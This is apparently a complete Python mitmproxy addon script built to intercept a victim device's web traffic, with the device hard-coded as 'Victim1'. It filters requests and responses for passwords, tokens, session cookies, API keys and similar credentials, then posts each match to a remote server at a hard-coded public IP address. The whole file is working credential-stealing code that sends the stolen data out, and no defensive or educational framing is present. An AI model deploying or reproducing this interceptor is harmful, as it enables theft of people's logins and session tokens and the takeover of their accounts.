import json
import requests
from mitmproxy import http

# Configuration
SERVER_URL = "http://18.140.67.178:9090/intercepted" # Web Server
#SERVER_URL = "http://127.0.0.1:9090/intercepted" # localhost
DEVICE_ID = "Victim1"

# Domains to ignore for responses
EXCLUDED_DOMAINS = {"google.com", "youtube.com", "facebook.com", "twitter.com", "linkedin.com", "instagram.com"}

# Keywords that indicate sensitive information
SENSITIVE_KEYS = {"username", "password", "pass", "email", "token", "auth", "session", "apikey", "key", "jwt", "id",
                  "identity"}

# Content types to exclude
EXCLUDED_CONTENT_TYPES = {
    "text/css", "image/png", "image/jpeg", "image/gif",
    "image/webp", "video/mp4", "video/webm", "video/ogg",
    "font/woff", "font/woff2", "application/javascript"
}

# File extensions to exclude
EXCLUDED_EXTENSIONS = {".css", ".js", ".woff", ".woff2", ".svg", ".png", ".jpg", ".jpeg", ".gif", ".mp4", ".webm",
                       ".mov"}


def send_to_server(data):
    """Send filtered intercepted data to Flask server."""
    try:
        response = requests.post(SERVER_URL, json=data, proxies={"http": None, "https": None})
        print(f"[INFO] Sent log to server: {json.dumps(data, indent=4)} | Response Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Failed to send log: {e}")


def extract_request_data(flow: http.HTTPFlow):
    """Extracts and formats intercepted HTTP request data, filtering out unnecessary information."""

    # Skip requests that fetch static resources
    if any(flow.request.pretty_url.endswith(ext) for ext in EXCLUDED_EXTENSIONS):
        print(f"[INFO] Skipping static request: {flow.request.pretty_url}")
        return None

    # Filter headers and cookies for sensitive information
    headers = {k: v for k, v in flow.request.headers.items() if any(s in k.lower() for s in SENSITIVE_KEYS)}
    cookies = {k: v for k, v in flow.request.cookies.items() if any(s in k.lower() for s in SENSITIVE_KEYS)}
    query_params = {k: v for k, v in flow.request.query.items() if any(s in k.lower() for s in SENSITIVE_KEYS)}

    # Extract body only if it's a relevant method (POST, PUT, PATCH, DELETE) and contains sensitive info
    request_body = None
    if flow.request.method in {"POST", "PUT", "PATCH", "DELETE"} and flow.request.text:
        try:
            body_data = json.loads(flow.request.text)  # Try parsing JSON body
            filtered_body = {k: v for k, v in body_data.items() if any(s in k.lower() for s in SENSITIVE_KEYS)}
            if filtered_body:
                request_body = filtered_body
        except (json.JSONDecodeError, AttributeError):
            if any(keyword in flow.request.text.lower() for keyword in SENSITIVE_KEYS):
                request_body = flow.request.text  # Include raw text if it contains sensitive keywords

    # If no sensitive data is found, ignore the request
    if not headers and not cookies and not query_params and not request_body:
        print(f"[INFO] No sensitive data found in request: {flow.request.pretty_url}")
        return None

    return {
        "device_id": DEVICE_ID,
        "type": "request",
        "method": flow.request.method,
        "url": flow.request.pretty_url,
        "query_params": query_params,
        "headers": headers,
        "cookies": cookies,
        "request_body": request_body
    }


def is_mostly_encoded(text):
    """Determines if a response body is mostly encoded or unreadable (binary-like data)."""
    try:
        # Check if text contains too many non-printable characters
        non_printable_ratio = sum(1 for char in text if ord(char) < 32 or ord(char) > 126) / len(text)
        return non_printable_ratio > 0.5  # More than 50% non-printable → ignore
    except:
        return True  # If processing fails, assume it's encoded and ignore


def extract_response_data(flow: http.HTTPFlow):
    """Extracts and filters HTTP response data for sensitive user information."""

    # Skip responses from excluded domains
    if any(domain in flow.request.pretty_url for domain in EXCLUDED_DOMAINS):
        print(f"[INFO] Skipping response from domain: {flow.request.pretty_url}")
        return None

    # Skip responses with excluded content types
    content_type = flow.response.headers.get("content-type", "").split(";")[0] if flow.response else None
    if content_type in EXCLUDED_CONTENT_TYPES:
        print(f"[INFO] Skipping response with content type: {content_type} from {flow.request.pretty_url}")
        return None

    # Try extracting JSON response data
    response_body = None
    if flow.response.text:
        # Ignore if mostly encoded or unreadable
        if is_mostly_encoded(flow.response.text):
            print(f"[INFO] Skipping encoded/unreadable response from {flow.request.pretty_url}")
            return None

        try:
            response_data = json.loads(flow.response.text)  # Try parsing JSON response
            filtered_response = {k: v for k, v in response_data.items() if any(s in k.lower() for s in SENSITIVE_KEYS)}
            if filtered_response:
                response_body = filtered_response
        except (json.JSONDecodeError, AttributeError):
            if any(keyword in flow.response.text.lower() for keyword in SENSITIVE_KEYS):
                response_body = flow.response.text  # Include raw text if it contains sensitive keywords

    # If no sensitive data is found, ignore the response
    if not response_body:
        print(f"[INFO] No sensitive data found in response: {flow.request.pretty_url}")
        return None

    return {
        "device_id": DEVICE_ID,
        "type": "response",
        "url": flow.request.pretty_url,
        "response_status": flow.response.status_code,
        "response_headers": {k: v for k, v in flow.response.headers.items() if
                             any(s in k.lower() for s in SENSITIVE_KEYS)},
        "response_body": response_body
    }


def request(flow: http.HTTPFlow):
    """Intercept HTTP requests, filter, and send only useful data to the server."""
    data = extract_request_data(flow)
    if data:
        send_to_server(data)
    flow.resume()  # Ensure the request is forwarded


def response(flow: http.HTTPFlow):
    """Intercept HTTP responses, filter, and send only useful data to the server."""
    data = extract_response_data(flow)
    if data:
        send_to_server(data)
    flow.resume()  # Ensure the response is forwarded
